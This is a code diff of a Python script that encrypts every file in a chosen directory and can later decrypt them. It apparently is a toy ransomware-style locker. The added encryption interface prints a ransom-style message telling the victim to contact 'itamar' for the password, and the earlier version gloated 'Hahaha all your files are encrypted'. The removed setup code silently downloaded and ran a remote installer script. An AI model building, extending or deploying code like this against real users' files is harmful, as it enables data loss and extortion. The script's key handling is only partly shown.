@@ -1,94 +1,8 @@
 import os
 import subprocess
 import sys
-import platform
-import urllib.request
-import gzip
-import io
-import re
-import threading
-import time
-from cryptography.fernet import Fernet
-import hashlib
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import getpass
 
-# Global flag to stop loading animation
-stop_animation = False
-
-# Function to display a loading animation
-def loading_animation():
-    animation = "|/-\\"
-    idx = 0
-    while not stop_animation:
-        print(f"\rDownloading... {animation[idx % len(animation)]}", end='', flush=True)
-        idx += 1
-        time.sleep(0.1)
-
-# Function to check the installed Python version
-def get_installed_python_version():
-    version_info = sys.version_info
-    return f"{version_info.major}.{version_info.minor}.{version_info.micro}"
-
-# Function to get the latest Python version from the Python website
-def get_latest_python_version():
-    url = "https://www.python.org/downloads/"
-    try:
-        response = urllib.request.urlopen(url)
-        # Check if the response is compressed
-        if response.headers.get('Content-Encoding') == 'gzip':
-            buf = io.BytesIO(response.read())
-            with gzip.GzipFile(fileobj=buf) as f:
-                html = f.read().decode('utf-8', errors='replace')
-        else:
-            html = response.read().decode('utf-8', errors='replace')
-        
-        match = re.search(r'Latest Python 3 Release - Python (\d+\.\d+\.\d+)', html)
-        return match.group(1) if match else "3.13"
-    except Exception as e:
-        print(f"Error fetching latest Python version: {e}")
-        return "3.13"
-
-# Function to download and install Python if needed
-def update_python():
-    latest_version = get_latest_python_version()
-    installed_version = get_installed_python_version()
-    
-    if installed_version == latest_version:
-        print(f"Python {installed_version} is already the latest version.")
-        return
-    
-    print(f"Updating Python from version {installed_version} to {latest_version}...")
-    installer_url = f"https://www.python.org/ftp/python/{latest_version}/python-{latest_version}-amd64.exe"
-    installer_path = f"python-{latest_version}-amd64.exe"
-
-    try:
-        print("Downloading Python...")
-        urllib.request.urlretrieve(installer_url, installer_path)
-        
-        print("Installing Python...")
-        subprocess.check_call([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
-        
-        print("Python updated successfully.")
-        os.remove(installer_path)
-    except Exception as e:
-        print(f"Error updating Python: {e}")
-
-# Function to install or upgrade pip
-def install_or_upgrade_pip():
-    try:
-        import pip
-    except ImportError:
-        print("Installing pip...")
-        download_and_install('https://bootstrap.pypa.io/get-pip.py')
-        print("pip installed successfully.")
-    else:
-        print("Upgrading pip...")
-        execute_command([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
-        print("pip upgraded successfully.")
-
-# Function to install required libraries
+# Ensure required libraries are installed, and install them if missing
 def install_required_libraries():
     required_libraries = {
         "cryptography": "cryptography",
@@ -100,45 +14,16 @@ def install_required_libraries():
             __import__(library)
         except ImportError:
             print(f"Required library '{package_name}' not found. Installing...")
-            execute_command([sys.executable, "-m", "pip", "install", package_name])
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
 
-# Utility function to execute a command and hide its output
-def execute_command(command):
-    with open(os.devnull, 'w') as devnull:
-        subprocess.check_call(command, stdout=devnull, stderr=devnull)
+install_required_libraries()
 
-# Utility function to download and install a script
-def download_and_install(url):
-    script_name = url.split('/')[-1]
-    urllib.request.urlretrieve(url, script_name)
-    execute_command([sys.executable, script_name])
-    os.remove(script_name)
-
-# Start the loading animation in a separate thread
-def start_loading_animation():
-    global stop_animation
-    stop_animation = False
-    animation_thread = threading.Thread(target=loading_animation)
-    animation_thread.start()
-    return animation_thread
-
-# Stop the loading animation
-def stop_loading_animation(animation_thread):
-    global stop_animation
-    stop_animation = True
-    animation_thread.join()
-    print("\rDone!                      ")
-
-# Function to install or upgrade pip and required libraries
-def setup_environment():
-    animation_thread = start_loading_animation()
-    try:
-        update_python()
-        install_or_upgrade_pip()
-        install_required_libraries()
-    finally:
-        stop_loading_animation(animation_thread)
-        clear_screen()
+# Import necessary libraries after installation
+from cryptography.fernet import Fernet
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import hashlib
+import getpass
 
 # Clear the screen based on the operating system
 def clear_screen():
@@ -264,21 +149,71 @@ if __name__ == "__main__":
     with open('show_key.py', 'w') as script_file:
         script_file.write(show_key_script)
     clear_screen()
+    print("A script has been created to reveal the key if you have the password.")
 
-# Main function to drive the script
+# Remove temporary files created during encryption
+def remove_temp_files():
+    if os.path.exists('key.txt'):
+        os.remove('key.txt')
+    if os.path.exists('show_key.py'):
+        os.remove('show_key.py')
+
+# Encrypt files in the specified directory, save the encryption key, create a script to show the key, and prompt the user to continue
+def encryption_interface():
+    try:
+        directory = input("Enter the path of the directory to encrypt (or type 'here' to use the current directory): ").strip()
+        
+        if directory == 'here':
+            directory = os.getcwd()
+
+        if not os.path.isdir(directory):
+            print("Invalid directory path")
+            return
+
+        key = generate_key()
+        encrypt_directory(directory, key)
+        
+        save_encrypted_key(key)
+        create_show_key_script()
+        input("Press Enter to continue...")
+
+        clear_screen()
+        print_large_message_in_green("All your files have been encrypted... \naccess itamar to get the password to decrypt!!")
+
+    except Exception as e:
+        print(f"An error occurred during encryption: {e}")
+
+# Decrypt files in the specified directory using the provided key, clear the screen, and remove temporary files
+def decryption_interface():
+    try:
+        directory = input("Enter the path of the directory to decrypt (or type 'here' to use the current directory): ").strip()
+        
+        if directory == 'here':
+            directory = os.getcwd()
+
+        if not os.path.isdir(directory):
+            print("Invalid directory path")
+            return
+
+        key = input("Enter the original encryption key: ").strip().encode()
+
+        decrypt_directory(directory, key)
+        clear_screen()
+        print_large_message_in_green("All files have been successfully recovered.")
+
+        remove_temp_files()
+
+    except Exception as e:
+        print(f"An error occurred during decryption: {e}")
+
+# Main function to prompt the user to encrypt or decrypt files
 def main():
-    setup_environment()
     action = input("Would you like to encrypt or decrypt the files? (e/d): ").strip().lower()
 
     if action == 'e':
-        encryption_key = generate_key()
-        save_encrypted_key(encryption_key)
-        encrypt_directory(os.getcwd(), encryption_key)
-        print_large_message_in_green("Hahaha all your files are encrypted")
+        encryption_interface()
     elif action == 'd':
-        decryption_key = input("Enter the encryption key: ").encode()
-        decrypt_directory(os.getcwd(), decryption_key)
-        print_large_message_in_green("All files have been successfully recovered.")
+        decryption_interface()
     else:
         print("Invalid action. Please choose either 'e' or 'd'.")
 
